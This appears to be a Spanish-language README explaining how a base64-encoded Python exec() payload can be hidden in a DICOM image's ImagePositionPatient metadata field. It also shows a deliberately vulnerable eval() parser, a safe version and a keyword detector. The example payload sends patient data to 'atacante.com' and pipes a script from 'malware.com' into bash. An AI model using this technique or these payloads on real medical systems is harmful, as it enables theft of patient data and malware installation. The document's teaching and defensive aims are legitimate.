# radiografihack

caso real de **esteganografía y explotación de formatos de archivo**:

## **Concepto Base: "Esteganografía en Metadatos"**

### **1. Abuso de Campos DICOM**
- Los archivos DICOM contienen **miles de campos de metadatos** para información médica
- Muchos de estos campos aceptan **texto libre** o **valores numéricos**
- El campo `ImagePositionPatient (0020,0032)` normalmente almacena coordenadas 3D
- Pero puede contener **cualquier texto**, incluyendo código ejecutable

### **2. Codificación del Payload**
Tu función `encode_payload()` hace:
```python
# Convierte: print('Hola desde DICOM')
# En: exec(__import__('base64').b64decode(b'cHJpbnQoJ0hvbGEgZGVzZGUgRElDT00nKQ=='))
```
- **Base64**: Codifica el código para evitar problemas de caracteres especiales
- **exec()**: Función Python que ejecuta código dinámicamente
- **__import__()**: Importa módulos sin usar `import` directo (útil en restricciones)

### **3. Inserción en DICOM**
```python
# Campo original: ['0', '0', '0'] (coordenadas X,Y,Z)
# Campo modificado: ['0', '0', '0', 'exec(__import__("base64").b64decode(b'cHJpbnQo...'))']
malicious_tag = '\\'.join(['0', '0', '0', 'payload_codificado'])
```

## **Por Qué los Sistemas lo Ejecutarían**

### **Escenario de Explotación:**
1. **Aplicación vulnerable** lee el archivo DICOM
2. **Procesa los metadatos** para mostrar en interfaz
3. **Evalúa dinámicamente** los valores de los campos (ERROR CRÍTICO)
4. **Ejecuta sin querer** el código Python contenido

### **Código Vulnerable Ejemplo:**
```python
# EJEMPLO DE CÓDIGO VULNERABLE 
def procesar_dicom(file_path):
    ds = pydicom.dcmread(file_path)
    
    # VULNERABILIDAD: eval() en datos no confiables
    position = ds.ImagePositionPatient
    for coord in position:
        if '(' in coord:  # Supone que podría ser una expresión
            resultado = eval(coord)  # Ejecuta código arbitrario
```

## **Cómo se Previene Esto**

### **Buenas Prácticas de Seguridad:**
```python
# FORMA CORRECTA de procesar DICOM
def procesar_dicom_seguro(file_path):
    ds = pydicom.dcmread(file_path)
    
    # 1. Validar campos esperados
    if not hasattr(ds, 'ImagePositionPatient'):
        return None
    
    # 2. Sanitizar entrada
    position = ds.ImagePositionPatient
    coordenadas_seguras = []
    
    for coord in position:
        # 3. NUNCA usar eval() en datos externos
        # 4. Validar formato esperado (números)
        try:
            valor = float(coord)  # Solo conversión segura
            coordenadas_seguras.append(valor)
        except (ValueError, TypeError):
            # 5. Rechazar valores sospechosos
            logging.warning(f"Valor sospechoso en DICOM: {coord}")
            continue
    
    return coordenadas_seguras
```

## **Casos Reales Conocidos**

### **Vulnerabilidades Similares:**
- **DICOM**: Viewers médicos que procesan mal los metadatos
- **PDF**: Scripts embebidos en metadatos XMP
- **JPEG**: Comentarios EXIF con código JavaScript
- **Office Macros**: Código VBA en documentos

### **Ejemplo de Explotación Real:**
```python
# Payload que podría explotar una vulnerabilidad
payload = """
import os, requests
# Exfiltrar datos médicos
datos = os.environ.get('PACIENTE_INFO')
requests.post('http://atacante.com/robo', data=datos)
# O instalar malware
os.system('curl http://malware.com/script.sh | bash')
"""
```

## **Consideraciones Éticas y Legales**

### **Uso Legítimo:**
- **Pruebas de penetración** autorizadas
- **Investigación de seguridad**
- **Concienciación** sobre vulnerabilidades
- **Desarrollo de herramientas de detección**

### **Uso Ilegítimo:**
- **Ataques a sistemas médicos** (crímenes graves)
- **Modificación de diagnósticos**
- **Robo de datos de pacientes**

## **Detección y Mitigación**

### **Herramientas de Detección:**
```python
def detectar_payload_dicom(file_path):
    """Detecta payloads sospechosos en DICOM"""
    ds = pydicom.dcmread(file_path)
    
    indicadores = [
        'exec(__import__',
        'base64.b64decode',
        'eval(compile',
        '__import__',
        'os.system',
        'subprocess.call'
    ]
    
    for elem in ds.iterall():
        if hasattr(elem, 'value'):
            valor = str(elem.value)
            if any(ind in valor for ind in indicadores):
                print(f"ALERTA: Campo {elem.tag} contiene código sospechoso")
                return True
    return False
```

## **Conclusión**

**Funciona porque:**
1. Los formatos complejos como DICOM tienen muchos campos de metadatos (en la mayoria de hospitales se tienen sistemas obsoletos y el EDR no verifica esto)
2. Las aplicaciones pueden procesar estos campos de forma insegura
3. Python permite ejecución dinámica de código fácilmente
4. La codificación Base64 evade detección básica

**Es efectivo para:**
- Demostrar vulnerabilidades en procesadores DICOM
- Educación en seguridad ofensiva
- Pruebas de concepto en entornos controlados
